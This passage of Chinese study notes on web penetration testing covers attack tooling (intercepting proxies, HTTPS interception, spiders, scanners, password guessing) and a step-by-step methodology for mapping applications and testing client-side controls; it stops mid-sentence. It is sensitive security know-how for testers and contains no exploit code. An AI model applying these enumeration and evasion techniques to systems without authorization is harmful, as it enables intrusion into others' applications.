代码浏览工具为了完成源代码的审查，不可避免需要实现大量搜索、跳转等动作，因此，使用一个支持多种语言的源码浏览软件，会提高很多效率，常见的有 Visual Studio、NetBeans 和 Eclipse 等。作者在此处推荐了一个以前没听说的，叫 Source Insight，估计是专门针对这个场景进行开发和优化的； 20. Web 应用程序工具包理论上只需要一个浏览器就可以发起 Web 攻击，不过这样做显示效率不高，因为浏览器毕竟是作为普通用户浏览 Web 网站的场景而开发的，因此更高效的做法是开发额外的工具，将它放在浏览器和目标应用程序之间，拦截浏览器和应用程序之间的请求和响应，根据需要修改请求和读取响应，实现预期的目标。 第二类工具是基于常见的漏洞特征，自动对目标应用程序进行扫描，寻找是否存在潜在的漏洞。第三类工具是针对某种特定的漏洞执行特定的任务，这类工具使用的频率比较低，但由于它是针对性开发，因此在针对特定问题上，其效果非常好。 Web 浏览器不的浏览器厂家，其开发的浏览器功能和配置有所不同，因此在使用它们进行攻击时，需要了解并利用它们不同的特性，来提高攻击的效率； Internet Explorer虽然 IE 浏览器已经非常古老了，但令人遗憾的是，目前它仍然在世界上占据一定的市场份额，它只能运行在 Windows 平台上，而且也只有它支持 ActiveX 控件。 截止 2021-5-1，网上查到的各浏览器市场份额如下： IE 8 引入了反 XSS 功能，并且默认开启，因此在探查 XSS 漏洞时，需要先将其关闭。待找到漏洞后，再将其打开，如果需要，可进一步规避该漏洞的办法； 以下两个 IE 扩展可协助攻击 Web 应用程序： HttpWatch：用于分析所有的 HTTP 请求和响应； IEWatch：功能与 HttpWatch 类似，另外还可用于分析 HTTP 文档、图像和脚本等； Firefox由于每个浏览器的特性不同，因此针对 IE 无效的 XSS 攻击，可能在 Firefox 有效。以下是常见的攻击辅助扩展： HttpWatch：同样可用于 Firefox FoxyProxy：设置浏览器的代理，可快速切换代理，并为不同的 URL 设置不同的代理； LiveHTTPHeader：修改消息头； PrefBar：启用禁用 cookie、检查访问控制、切换代理、清除缓存； Wappalyzer：确定页面技术栈； WebDeveloper 工具栏：查看所有页面链接、更改页面 HTML、取消表单长度限制、显示隐藏的表单字段、修改请求方法； Chrome XSS Rays：XSS 漏洞和 DOM 漏洞测试； cookie 编辑器 Wappalyzer WebDeveloper 测试集成工具早期的工具是 Achilles，虽然功能简单，但有经验的攻击者可用它实现攻击。当前各常用工具如下： 每种套件的侧重点有所不同，建议多尝试几种，再从中选择一两个合适的； 工作原理各个套件的原理大同小异，它内部一般由多个功能模块组成，不同的模块共享相同的请求和响应数据；它会拦截监控浏览器的请求和响应，并保存与应用程序相关的信息，并配套各种不同的功能对这些信息进行读取或修改；其核心组件一般包括： 拦截器代理拦截是各集成测试软件的核心功能。为了实现拦截，需要先配置浏览器中的代理服务器选项，让浏览器与指定的本地端口发生通信；之后浏览器所有的请求都会发往该端口（实质上该端口即是操作系统为套件分配的端口，当浏览器向该端口发送请求时，请求的数据将由操作系统转发给套件进程进行处理，之后套件转发请求到因特网，并在收到应用程序的响应后，再根据需要转发给浏览器）； 配置浏览器大多数浏览器都有使用代理服务的选项，只要按照文档，简单的设置一下就搞定了。 有些应用程序使用厚客户端，并不在浏览器中运行，而是由客户端直接访问硬编码的域名，因此常规的浏览器代理设置行不通。针对这种情况，有一个简单的解决办法是修改操作系统的 hosts 文件，它在操作系统层面，将指定域名解析到指定的 IP 地址； 虽然修改 hosts 可以解析域名问题，但是端口指定不了，因此接下来还需要配置攻击套件监听 80 和 443 端口，并让端口支持匿名代理功能（开启匿名代理后，发往该端口的非代理请求，将强制被重定向）； 为了避免代理 HTTPS 请求遇到 SSL 证书错误的问题，还需要将匿名代理服务器配置为特定域名的 SSL 证书； 配置套件选项，让其将特定主机名解析为其原始的 IP 地址，以覆盖本地主机的 DNS 解析，使其转发出的请求能够被发送正确的目标服务器（不然会被主机的 hosts 设置再转发回给自己）； 攻击套件需要用到请求中的 Host 字段，来实现转发功能。如果请求中没有 Host 字段，就需要手工预设了。如果应用程序只一个目标主机名还好说，如果有多个，就有点蛋疼了。此时需要在多个机器上运行多个套件实例，来模拟不同的远程主机名；每个实例负责转发一个特定的主机名； 拦截代理服务器与 HTTPS 当开启浏览器中的代理选项后，浏览器发出的请求跟普通请求略有不同，据说是代理格式的请求，之后需要由拦截器转换成非代理的请求，再发送给目标服务器；好奇代理格式的请求的不同点在哪些 对于 HTTPS 连接，普通的代理服务器将通过建立和保持 connect 连接，来扮演请求中继的功能，浏览器将直接和目标服务器建立 SSL 握手，这意味着代理服务器并无法知道通过 HTTPS 加密传输的内容。因此，拦截服务器并不能以中继的模式工作，不然无法起到拦截的作用。而是要扮演中间商的作用，分别与浏览器和目标服务器建立两个独立的 SSL 握手，浏览器与目标服务器之间则不发生直接的接触； 当通过浏览器向目标域名发起请求，收到的却是拦截器提供的 SSL 证书时，浏览器会出现警告弹窗，询问用户是否信任该证书，由于攻击者即是用户本人，因此攻击者可以完全控制浏览器并点击接受。 但接下来会遇到一个问题，目标服务器返回的响应内容中，很有可能携带指向第三方域名的链接，例如引用图片、视频等，而这些第三方域名很可能也是使用 HTTPS 进行访问的；当浏览器向这些第三方域名发起请求时，收到的却是拦截器提供的证书，此时浏览器很可能不再会出现弹窗，询问用户是否接受，而是直接丢弃该请求，并显示一条警告。 另外，当不使用浏览器，而是使用厚客户端向目标服务器发起请求时，厚客户端也很有可能不会相信拦截器的 SSL 证书。 要解决以上问题，关键是要回到问题的原点，即了解一个证书能否被信任，它的过程是怎样发生的。事实上，出于安全和实用的考虑，每个操作系统在出厂的时候，都预安装了一些第三方 CA 机构的根证书。之后各种 SSL 的校验，其实都是通过证书链，最终推导到这些根证书来进行验证的。因此，只要在操作系统中，将自己生成的证书，添加成可信用的 CA 机构，那么由该证书签名的其他证书，就会变成可信的了； 共同特性围绕拦截这个基本功能，集成工具一般还配备了高效的辅助工具包，包括： 详细的拦截规则：通过设置规则，只拦截满足规则的请求或响应，提高测试效率； 完整的请求和响应记录：可根据需要，将记录转发给其他模块进一步分析处理；并可检索过滤满足特定条件的记录，快速定位； 对请求和响应进行自动匹配和替换：例如自动修改某个参数，修改 cookie 值，删除缓存、修改消息头等； 修改 HTTP 消息格式：例如切换不同的内容编码； 修改 HTML：如显示隐藏表单字段、删除输入限制、删除 JS 检查； 爬虫相对于静态页面爬虫，Web 应用程序的爬虫要复杂一点，因为它要处理很多动态生成的东西，并且功能之间经常有顺序要求。使用爬虫的目的在于获取所有关于目标应用程序的功能和内容，以便为下一步的分析做好准备。配合手工浏览，爬虫可以协助发现更多的内容，并将内容获取过程自动化，提高效率，实现彻底搜索； 常用功能如下： 自动构建网站地图； 精准爬取指定内容：通过设置规则，准确抓取某一部分指定的内容；避免抓取一些无关的内容，或者访问一些敏感功能，导致出现不可逆的破坏，或者会话终止； 自动解析内容：如 HTML 表单、脚本、注释、图像等，之后可在站点地图中便捷的分析它们； 解析 JS 代码，从中发现动态的 URL 和资源； 根据预设置参数，自动提交表单； 自定义无效资源的规则，让网站地图的构建更加精准（因为有些服务器即使请求的资源无效，也会返回 200 状态）； 通过检查 robots 文件来发现隐藏的资源； 根据枚举的目录，自动抓取里面的内容（即使这些内容链接并没有出现在响应中）； 自动获取和使用 cookie； 自动测试每个页面的 cookie 依赖性； 自动设置正确的 Referer 消息头（因为有些服务端会使用该消息头判断请求是否由人而非机器发起）； 可自定义任意的消息头； 控制自动抓取的速度和顺序，避免请求过快导致服务器崩溃，并让抓取的行为更加隐蔽； 测试器自动化工具可以提高测试的效率，集成工具通常包含如下常用的功能： 常见漏洞扫描的自定义配置； 内置攻击荷载和自定义函数，可根据自定义选项，自动生成任意的有效荷载； 保存扫描数据，可用于生成报告，也可传递给其他模块使用； 可自定义响应查看条件，例如根据表达式，筛选出满足条件的响应； 从响应中提取有用的数据，例如提取用户名和密码，供后续其他攻击使用； 扫描器扫描器一般包含两类扫描功能： 被动扫描：监控浏览器的请求和响应内容，分析是否存在常见的漏洞，如明文密码、cookie 配置错误、跨域 Referer 泄露等； 主动扫描：向目标程序发起攻击荷载，探查潜在漏洞，例如跨站点脚本漏洞、HTTP 消息头注入、文件遍历漏洞等；此类扫描对应用程序有一定的破坏性，可能引起应用程序故障； 扫描器的使用方法： 在手动解析应用程序的内容后，从生成的站点地图中选择感兴趣的部分，然后用扫描器对其进行扫描，这样可以提高效率，了解关键区域存在漏洞的可能性； 当手动测试单个请求时，可以配合扫描器一起使用。通过扫描器检查该请求是否存在常见漏洞； 在通过爬虫抓取整个程序后，使用扫描器扫描所有内容，类似独立的 Web 扫描器； 在浏览目标程序时，可以 Burp Suite 中开启实时扫描功能。这样借助浏览动作，将需要扫描的请求，实时的发给扫描器，而不必再额外手动进行配置； 虽然集成工具的扫描器的设计用途与独立扫描器不同，但事实上它的核心功能很强大，能够完成更多事情； 手动请求工具当需要对某个资源或接口进行深入探查时，我们一般会切换到手动的模式，此时需要对同一个资源或接口重复发布请求，但每个请求之间的内容有所区别。此时就会需要用到手动请求工具，来提高效率 这方面也有一些独立的工具，例如 Netcat，但一般集成套件也会有集成；集成后更加方便，当使用其模块进行初步探查中，再从中挑选感兴趣的部分，进一步进行深入的探查；探查的过程中，还可以利用其他模块共享的一些功能，例如 HTML 呈现、下游代理、验证、自定义消息头等； 手动请求的常用功能： 与其他模块配合，相互传递请求和数据； 保存所有请求和响应的历史记录，方便进入深入分析； 支持选项卡展示，可一次性处理多个不同的请求； 自动跟踪重定向； 会话令牌分析器会话令牌理想状态下应该是随机生成的，但是有些 Web 应用程序并没有做到这点。会话令牌分析器（Burp 中的 Sequencer）会基于样本对随机程度进行判断； 共享功能与实用工具 自动解析 HTTP 消息结构，例如消息头、请求参数等； 自动解析各种序列化的数据； 自动渲染 HTML 内容，就像在浏览器中查看一样； 支持以文本和十六进制格式编辑和显示消息； 支持对请求和响应内容的搜索； 编辑请求后，自动更新 Content-Length 属性； 内置编码器和解码器，可对请求和响应中的内容进行自动化解码或编码； 自动比对两个响应之间的不同之处，并突出显示； 自动化分析和发现易攻击面； 支持持久化保存会话数据； 支持下游代理和 SOCKS 代理； 内置 HTTP 验证方法； 支持客户端的 SSL 证书； 支持更深入的处理 HTTP 属性，例如 gzip 内容编码、块传输编码、状态码等； 支持使用第三方的插件对内置功能进行扩展； 常规任务自动化，例如自动爬取、扫描等； 支持持久化保存选项配置； 平台独立性； 测试工作流程典型的测试工作流程如下： 基本思路： 先解析应用程序的所有功能和请求，形成访问的历史记录和站点地图； 从历史记录或站点地图中，挑选最有可能存在漏洞的功能，发送给特定的模块，进行测试；例如将输入功能发给模糊测试、将令牌发给令牌分析器、使用 Repeater 对某个资源重复发送请求，检查漏洞是否存在等； 找到漏洞后，再回到浏览器检查漏洞是否被触发了，例如跨站点脚本是否注入成功，并会在浏览器触发执行等、SQL 注入成功，浏览器是否显示 SQL 的查询结果等； 测试人员不应该局限于上面的基本思路，可以发挥创意，尝试更多的测试办法，各种模块的组合，甚至还可以引入新的测试工具； 拦截代理服务器替代工具使用拦截代理服务器会导致浏览器和目标应用程序之间的通信被中断，有时候这种中断会导致部分应用程序的功能不可用，导致测试无法进行。此时只能去掉代理服务器，直接使用浏览器跟服务器进行通信，但是通过安装浏览器扩展，我们仍然能够完全控制浏览器发出的任意请求。 虽然扩展可以控制任意的请求，但是它的缺点是只能手动操作，可能也缺少自动抓取、模糊测试、漏洞扫描等功能；当然，如果可以的话，自己编写浏览器扩展是可以解决以上问题； 常用的浏览器扩展示例如下，测试员应该多多搜索和试用，并挑选最合适的工具： Tamper DataFirefox 扩展，当浏览器尝试提交表单时，它会进行拦截，并跳出弹窗，显示发送的报头和参数，可根据需要进行修改； TamperIETamper Data 的 IE 版本，功能相同； 独立漏洞扫描器独立漏洞扫描器的好处在于可以快速发现应用程序是否存在常用的漏洞。在收集完应用程序的功能和站点地图后，扫描就会针对各个功能发起各种攻击请求，并自动分析响应内容，从中查找漏洞存在的关键特征，之后生成一份漏洞报告。 扫描器探测到的漏洞有些漏洞有非常明显的特征，通过扫描器可以非常可靠的探测到。有时候，在应用程序的请求和响应中，自带这些特征。当发现这些特征后，扫描器就会有针对性的发送一个攻击荷载，看漏洞是否会被触发，如果会的话，扫描器就会将漏洞记录到报告中； 扫描器可以探测到的常见漏洞有： 反射型跨站点脚本漏洞：此时用户提交的输入未被检查或净化，可直接在响应中返回； SQL 注入漏洞：提交单引号会导致响应返回 ODBC 错误；或者提交特定字符串，会导致响应的时间延迟； 路径遍历漏洞：提交对某个已知文件的请求，然后看响应中是否出现该文件内容； 命令注入漏洞：提交注入导致响应延迟，或者某个特殊内容可以在响应中出现； 目录列表：提交目录请求，从响应中查看是否有目录列表； 明文密码、cookie、开启自动完成表单：直接通过检查请求和响应内容即可初步判断； 信息泄露：提交不同文件扩展名的枚举资源请求，检查是否存在未在链接中公开的文件和数据； 不过漏洞扫描器也不是万能的，它也存在很多的局限性，只要开发者对稍加注意，扫描器经常就无法在响应中发现漏洞特征，以下是一些扫描器难以准确判断的漏洞： 访问控制漏洞：此类漏洞可导致 A 用户访问 B 用户的数据，甚至是管理员的功能； 参数修改：扫描器无法预知修改某个参数，在逻辑上可能给应用程序带来的影响； 逻辑错误：例如提交负值，破坏计算逻辑；或者省略请求，跳过应用程序的检查步骤； 设计漏洞：例如低安全的密码，可通过枚举猜测； 会话劫持：攻击者通过猜测的会话令牌，假装另外一名用户登录； 敏感信息泄露：用户名列表、日志等； 虽然扫描器很有用，但是不能仅仅依赖它，因为有些漏洞它难以探查出来。在扫描器的基础上，应该多进一步分析； 扫描器限制虽然扫描器是专门研究 Web 应用程序漏洞的专家的所设计，但它仍然不可避免存在一些目前技术难以克服的先天限制，主要原因如下： Web 应用程序不是一种标准的程序，每个 Web 应用程序要解决的问题各不相同，因此写出来的代码千差万别，这也决定了其包含的漏洞形式和位置千差万别；相同的错误代码，却可能包含不同的错误消息，代表不同的含义。扫描器目前还无法像人类一样理解这些消息背后的真正含义，并做出下一步合理的行动。 针对某个应用程序的特殊异常表现，扫描器无法针对该异常做出有创造性的处理，它只能使用写好的既定步骤，完成标准的行为。扫描器只能按既定规则，蛮力提交大量请求。它无法从一堆响应中，找出最佳的攻击办法，例如根据多阶段步骤设计专门的输入、调整请求的顺序、在不同的步骤中传递消息等； 扫描器技术挑战 在扫描器自动化运行的过程中，有可能因为提交了某个请求，导致会话退出，此时有些扫描器无法自动重新登录，可能会导致部分漏洞被错过； 危险性：某些提交给应用程序的请求可能需要极大的破坏性，有可能直接导致应用程序崩溃，或者数据库的数据丢失； 扫描器一般将不同的链接理解为不同的内容，但事实上要测试的是功能，同一个功能，可能包含海量的链接，例如购物网站的商品链接，日历应用的日期链接等； 状态化处理：Web 应用程序的一个趋势是越来越多的保留大量状态在客户端，某个功能的完成，需要基于客户端的状态信息来完成； 避开应用程序的防御措施，例如出现异常立即终止会话、CAPTHA、二次验证等； 主流产品目前市场上主流的漏洞扫描器产品包括： Acunetix AppScan Burp Scanner Hailstorm NetSparker N-Stalker NTOSpider Skifish WebInspect w3af 大部分扫描器是收费的，少数是免费的，有趣的是，价格跟性能之间并没有直接关系。价格更高的不一定代表更好，价格低也不意味着性能不好 扫描器使用漏洞扫描器的好处是可以在最少的时间内，发现最多的漏洞，但最多一般也不会超过常见漏洞的 50%；这意味着它主要使用在以下场景中： 时间紧迫，需要尽快给出结果； 时间不紧迫，可基于该结果做为后续详细探查的参考； 使用时的注意事项： 了解扫描器能够发现的漏洞类型，以及它不能够发现的漏洞类型；（知其为，知其不可为） 熟悉扫描器的功能，知道如何进行配置，能够实现有效的扫描； 在扫描之前，先全面了解应用程序，以便更有针对性的利用扫描器的功能；（知已知彼，百战不殆） 了解抓取功能和全自动探查潜在的危险； 手动核实扫描报告中的所有潜在漏洞； 扫描器会在服务器和 IDS 防御中留下大量的“指纹”，如果要保持隐秘，则不要使用扫描器； 除非是对渗透测试不了解的用户，或者需要在短时间内处理大量的应用程序安全评估，不然一般不使用全自动的扫描。更好的做法是手动和自动的结合，通过手动在浏览器中访问目标 Web 应用程序，来指导扫描器的工作，这样好处多多，例如不容易遗漏关键的功能区域、避开危险功能、避开重复功能、处理可能遇到困难的输入确认、避免会话中断、正确处理多阶段的状态等； 其他工具除了主流的渗透测试工具外，还有很多其他工具可以处理一些不常见的特殊任务，以下仅包含一些常用的，当遇到其他场景时，应该上网搜索并尝试更多更好的工具。 Wikto/NiktoNikto 主要用来探查服务器上是否存在一些常见的第三方内容，它的工作原理很简单，就是先收集市面上各种普通使用的第三方内容，形成自己的数据库，然后基于该数据库，提出对应的请求，分析响应内容，从中找出关键特征，确认第三方内容是否存在；它的数据库会不断频繁的更新，以跟进最新的动态，因此比集成渗透工具要覆盖的多； 另外根据应用程序的自定义义行为，Nikto 允许对其分析功能进行配置，避免一些误警报； Wikto 是 Nikto 的 Windows 版本； FirebugFirebug 是在浏览器中使用的工具，通过它可以任意的修改 HTML 页面上的标签内容和脚本（可能有点像油猴）；它主要用来分析和实现针对客户端的攻击，例如跨站点脚本、请求伪造、UI 伪装、跨域数据捕获攻击等； HydraHydra 是一个密码猜测工具，根据用户提供的用户名列表、URL 链接、线程数量等，它会生成大量的请求，然后根据响应判断密码是否猜测正确； 定制脚本一般情况下，使用通用工具，可以完成大多数的渗透测试任务。但在少数情况下，可能需要通过编写定制化的脚本，来解决特定的问题，常用场景如下： 应用程序使用会话机制比较特别，例如：提交页面令牌有先后顺序要求； 某个漏洞，需要重复执行多个特定动作后，才会暴露出来； 会话终止后，需要通过非标准步骤重新建立会话； 解决以上问题的办法，就是自己编写一段脚本来提示请求和处理响应，以完成特定的功能。有好的是，套件工具可能提供插件接口，可以将脚本集成到测试套件中（例如 Burp 的 Extender、WebScarab 的 Bean Shell）； 除了脚本本身可用的内置命令和第三方库以外，还可以调用操作系统 shell 中的工具，例如： Wget：通过 HTTP(S) 访问某个给定的 URL；它支持很多选项参数，例如：代理服务器、HTTP 验证等； curl：用于提交 HTTP(S) 请求，同样支持很多选项参数，例如：不同的请求方法、请求参数、SSL 证书、HTTP 验证等； netcat：主要用来处理与网络有关的任务，同样可以创建 TCP 连接，发送请求并处理响应；更有趣的是，它可以用来在本地创建一个监听器，接收来自其他计算机的连接请求（netcat 不支持 SSL 连接，但可以通过和其他工具配合使用来实现 SSL 连接）； stunnel：它最核心的功能就是用来辅助建立 SSL 连接，即可以用在 netcat 上，也可以用在自定义脚本上；它的工作原理其实也不复杂，就是扮演代理服务器的作用，先监听某个本地端口，当收到发送到这个端口的请求后，再转成 SSL 转发请求到目标服务器； 小结通过工具，可以极大的提高测试的效率。没有最好的工具，只有最合适的工具。 21. 渗透测试方法论通过抽象的方法论，能够更好的指导实践。渗透测试需要探查的区域可以总结如下： 虽然从这张图看上去，各个攻击面之间好像有先后顺序，但其实并没有。完全可以利用在某个阶段发现有用的信息后，再返回上一个阶段重新进行攻击测试；例如通过访问控制漏洞，获得用户列表后，就可以基于该列表实施更加有针对性的密码猜测攻击； 在某个功能中发现的漏洞，对当前功能可能并没有什么危害，但是却可以被利用它进行其他功能的攻击。例如通过文件泄露漏洞获得源代码，然后可以直接进行代码审查，提高漏洞探查的效率； 某个漏洞的探查结果，可以帮助其他环节提高探查效率（因为很可能在程序内部，函数之间存在复用），例如同一个输入过滤程序，很可能使用在不同的功能模块中；当发现某种输入过滤的漏洞后，就有可能极大的提高其他环节的漏洞探查效率，设计有针对性的攻击荷载，直接避开过滤； 注意事项务必牢记的注意事项： 转义部分字符在 HTTP 请求中，具有特殊的意义，而且出现在不同的位置时，可能意义不同；因为如果在请求中出现这些字符时，需要给它们进行 URL 编码，以确保它们能够被正确的识别和发送； &，用于在查询字符串和消息主体中分隔参数，字面量需要编码为 %26 =，用于在查询字符串和消息主体中连接参数键值对，字面量需要编码为 %3d ?， 用于在查询字符串中标记参数的起始位置，字面量需要编码为 %3f 空格，用于在请求的第一行标记 URL 结束，也用于在 Cookies 消息头中表示一个 cookie 值的结束；字面量需要编码为 %20 或者 + +，表示空格，字面量需要编码为 %2b ;，用于在 cookie 消息头中分隔多个 cookie 值，字面量需要编码为 %3b #，用于在 URL 中标记片段名称的起始位置，如果在 URL 中插入这个字符，URL 将被截短为插入位置前面的部分，后面的部分转换成片段标识；字面量需要编码为 %23 %，用于标记 URL 编码的起始位置，字面量需要编码为 %25 空字节，字面量需要编码为 %00 换行符，字面量需要编码为 %0a 二次转义浏览器通常会对表单中提交的数据进行 URL 编码，因为如果在表单中输入已经编码过的值，则很可能会导致二次编码，最好在拦截代理服务器中查看核定一下最终结果； 假阳性有时候良性请求，也会导致响应中出现漏洞特征，导致扫描器误以为存在漏洞。此时需要分别提交良性和攻击两种请求，看响应是否有所区别，以确定漏洞真实存在，而不是误报（假阳性）； 隔离扫描器通常会对某个接口发送多个请求，导致它出现了多种状态。它下一个请求可能需要在某个特定的状态下，才能继续，因此上一个请求的多种状态，会导致下一个请求无法正常进行。解决办法是可以换个浏览器建立新会话，提交良性请求导致到目标位置，提交攻击请求，然后观察是否出现异常的响应；当然，如果不想另开浏览器，也可以通过修改 cookie 值和缓存信息进行调整；或者，也可以使用 Burp Reapter 工具隔离请求，让每个请求的状态不会相互影响 负载均衡有些应用程序很可能使用负载均衡，后端可能存在不止一台服务器，因此某个攻击请求造成的影响，可能仅限于某台服务器；当下一个验证请求恰好没有到达该服务器时，可能会误以为攻击没有成功；解决办法是多次提交验证请求，直到请求被转发到目标服务器，验证攻击是否成功； 解析应用程序内容 搜索可见的内容 配置浏览器，使用代理服务器或爬虫工具，例如使用 Burp 和 WebScarab 监控并被动抓取代理服务器拦截的内容； 如果需要，除了从代理服务器入手外，也可以从浏览器入手；可以考虑安装浏览器扩展，例如 IEWatch，监控分析浏览器处理的 HTTP 和 HTML 内容； 以常规的方式，浏览整个应用程序，包括发现的每一个链接、提交每一个表单、完成多阶段功能；同时尝试在禁用 javascript 或 cookie 的状态下进行浏览；原因：针对不同内容和不同的浏览器设置，应用程序内部可能有相应的处理逻辑； 如果可以创建或者拥有登录账户，则访问所有被保护的功能； 在浏览过程中，留意客户端的代码如何对服务端返回的内容进行处理； 查看自动生成的站点地图，看是否包含未被手动浏览访问的链接或功能；例如可以使用 Burp Spider 中的 Linked From 功能，了解每项内容是从何处链接过来的；然后访问这些来源链接，向上追溯，以期找到更多的内容；反复递归使用这个方法，直到无法发现任何新内容； 手动浏览结束后，可进一步选择部分 URL 做为起点，使用爬虫进行自动抓取。这种方法有时会找到一些漏网之鱼；不过在进行自动抓取前，需要先创建可引起会话中断的链接列表，配置爬虫，避开这些链接； 浏览公开内容 网站的公开内容很可能会被搜索引擎的爬虫抓取过，因此，可以使用搜索引擎和档案库（如 Waybak Machine）来查找与目标应用程序相关的内容； 注意使用搜索引擎的参数来提高搜索效率，例如在 google 中： site，用来指定搜索的目标站点； link，获取链接到目标站点的其他站点； 在搜索引擎中发现的内容有时可能已被目标程序删除，但通过查看页面缓存，有时可以在里面发现一些有效的资源链接； 搜索在应用程序的内容中出现的任何姓名和电邮地址；这些内容有时候可能不在屏幕上显示，而是隐藏在注释中； 除了 Web 搜索外，还应进行新闻和小组讨论搜索， 因为有时候新闻内容可能包括与应用程序有关的技术信息； 检查任何已发布的接口文档，以了解应用程序可能采用的功能名称和参数说明； 发现隐藏的内容 先找到应用程序响应无效资源的规律，以便将这个规律用于枚举过程中的筛查；获取规律的办法：先手动向已知有效和已知无效的资源发起请求，比对返回的响应，看看应用程序在响应有效和无效资源时，有什么特征； 准备一份常见文件名、文件扩展名和常见目录的列表； 了解应用程序开发者的命名方案，以便猜测余下的资源名称；例如某个资源命名为 AddDocument 和 ViewDocument，那很可能存在 EditDocument 和 RemoveDocument 等资源； 查看客户端代码，从中发现与服务端内容有关的线索，HTML 注释和禁用的表单元素也需查看； 结合已知的资源名和目录名，再加第2步准备好的列表，向应用程序发送大量请求，根据第1步的特征筛查响应，以找出任何可访问的隐藏内容； 以上一步找到的内容为基础，再次使用爬虫，对它们进行手动和自动两方面的抓取； 查找第三方内容 使用 Nikto，探查服务端可能使用的任何第三方组件；注意设置 Nikto 的选项以提供探查的效率，例如使用 --root 选项可在指定目录中进行查找；或者使用 -404 选项指定一个字符串，对应用程序自定义的 Not Fount 页面进行标识； 手动核查结果，以找出其中可能有用的信息，避免出现漏网之鱼； 在 Host 消息头中指定 IP 地址，访问应用程序在服务器上的根目录。查看应用程序是否会返回不一样的响应；如果会的话，针对该 IP 地址进行 Nikto 扫描； 请求根目录时，分别设置不同的 User-Agent 值，看服务端是否会返回不同的内容； 枚举标识符函数有些应用程序会在请求参数中携带要执行的函数名称，例如：/admin.jsp/action=editUser 或 /main.php?func=A21，很有意思； 确定任何在请求参数中提交函数名称的链接； 分析它的命名规律，同时找出猜测失败时的响应特征； 准备一份常用的函数名称列表，发送大量枚举请求； 一般来说，应用程序的内容地图是基于 URL 路径来绘制的，但有时可换个思路，尝试基于函数名称，来编写内容地图；先通过枚举找出所有功能路径，然后为它们建立逻辑关系（详见第4章示例）； 调试参数有些应用程序会在 URL 中携带调试参数，以开启调试功能； 选择一个或多个可能使用调试参数的 URL，一般最有可能出现在登录、搜索、文件上传或下载的功能中； 枚举常见的调试参数名称（如 debug、test、hide、source 等）与常用的参数值（如 true、yes、on、1 等）；枚举所有键值对组合，向应用程序发送大量请求（据说 Burp 有个“集束炸弹”功能可以帮忙生成组合）； 分析响应，看是否与非调试状态的响应有所区别； 分析应用程序确定功能 了解为了让应用程序正常运行，需要建立的核心功能，以及每项功能需要涉及的操作； 了解应用程序使用的核心安全机制，以及这些安全机制的工作原理（重点可放在身份验证、会话管理、访问控制等关键的几个机制，以及它们的辅助功能如用户注册、忘记密码等）； 了解外围功能，如错误消息、管理功能、日志功能、站外链接、重定向的使用位置等； 找出任何与应用程序通用样式不一致的界面、参数命名或导航，将它们挑出来进行深入的测试（这些位置很可能使用第三方的组件）； 确定数据进入点 确定应用程序中所有引入用户输入的位置，包括 URL、查询字符串参数、POST 数据、cookie、消息头等； 了解应用程序使用的所有自定义的数据传输或者数据编码方法，例如自定义的查询字符串格式、被提交数据是否使用键值对或者其他表示方法； 了解所有在应用程序中引入的用户可控制的，或者第三方控制的带外通道，例如显示和处理 SMTP 邮件； 确定所使用的技术 找出客户端代码所使用的技术，例如表单、JS脚本、cookie、Java Applet、ActiveX 控件、Flash 对象等； 尽可能确定服务端所使用的技术，包括使用何种语言、框架、与数据库和电子邮件交互的组件等； 检查响应中的 Server 消息头，或者其他 HTTP 消息头、HTML 源代码注释中可能出现的标识符，通过标识符判断服务端所使用的服务器软件；有时，应用程序的不同功能可能使用不同的后端组件进行处理，因为可能会找到多种不同的标识符； 使用 Httprint 工具，分析 Web 服务器指纹； 检查上一步内容解析过程收集的信息，找出有助于了解服务端使用何种技术的关键信息，例如文件扩展名、目录、URL 序列等；检查会话令牌和 cookie 名称，并通过 google 搜索这些名称背后所使用的技术； 找出那些看起来有点意思的脚本名称和查询参数，因为它们可能属于第三方组件；使用 inurl 选项通过 google 搜索相关内容，找出同样使用这些第三方组件的其他站点。对这些站点实施非侵入审查，有可能会发现一些在目标应用程序中隐藏的功能和内容； 解析受攻击面 了解和推测服务端的应用程序内部结构和功能，以及为实现某些客户端功能的后台工作机制，例如查询订单的功能，大概率需要跟数据库发生交互； 罗列好功能后，再思考每一种功能背后可能发生的漏洞，例如文件上传功能可能存在路径遍历漏洞、用户间通信可能存在 XSS 漏洞、联系客服功能可能存在 SMTP 注入漏洞等； 制定攻击优先级计划，优先攻击最有用的功能以及与之相关的最严重的潜在漏洞； 测试客户端控件 客户端数据传送机制 找出所有在客户端传送数据的场景，包括但不限于隐藏的表单字段、cookie、URL 参数等； 根据所传送数据的名称、值和出现的位置，猜测它们在服务端应用程序逻辑中的用途； 尝试修改数据的值，看是否会对服务端的应用程序产生影响，包括了解应用程序是否接受任意值，还是会进行过滤；以及是否会干扰应用程序的逻辑，是否会触发或破坏一些安全机制； 如果客户端传送模糊数据，可尝试破译模糊算法，以便在模糊数据中写入任意指定值；以及可尝试不修改数据，而是在不同场景中提交相同的模糊数据，看是否会干扰应用程序的逻辑； 如何应用程序在客户端使用 ASP.NET ViewState，对其进行测试。看是否可以破坏它，或者查看其中是否包括敏感数据（不同页面，使用 ViewStatue 的方式可能有所不同） 使用 Burp 套件中的 ViewState 分析器，看 EnableViewStateMac 选项是否开启，如果开启的话，则数据不可修改，因为服务端将校验客户端提交的内容是否与发出时一致，如果修改，会触发错误； 查看解码后的 ViewState，看是否包含敏感数据； 尝试一个被解码的参数值，再重新编码，存入 ViewState；如果服务器接受修改后的 ViewState，则说明 ViewState 可被用于提交任意的输入。因此，可对其包含的数据进行和普通参数一样的测试； 客户端输入控件 找出所有客户端对输入进行限制的场景，了解其限制规则； 违法这些规则提交输入，轮流测试每一个参数，看服务端是否使用相同的输入确认； 检查所有的 HTML 表单，找出禁用的元素，如禁用的灰色按钮；并尝试与其他表单一起提交，看应用程序如何处理。如果发生异常行为的，思考是否可以在攻击过程中利用这种异常行为（代理服务器可以通过配置规则，自动启用禁用的字段，提高攻击效率，例如 Burp 套件中的 \"HTML修改\" 选项） 测试浏览器扩展组件了解组件功能 通过代理服务器拦截客户端和服务端之间的流量，监控其数据（如果数据被序列化，则可以使用套件的工具对其反序列化）； 有了数据后，查看在客户端中呈现出来的功能，从而了解这些数据被如何使用和呈现，能够为用户带来什么功能价值；必要时，可以重复发送关键请求，或者修改服务端返回的响应，了解功能如何实现； 反编译组件有些应用程序会使用一些厚客户端组件，例如 Java 的 applet 通过拦截代理服务器查找特定的文件类型，另外还可以在 HTML 源代码中进行查找，例如 applet 标签等； .class 或 .jar 文件：使用 Java .swf 文件：Flash .xap 文件：Silverlight 找出所有调用 applet 的地方，并确定 applet 返回的数据，是否被提交到服务端；applet 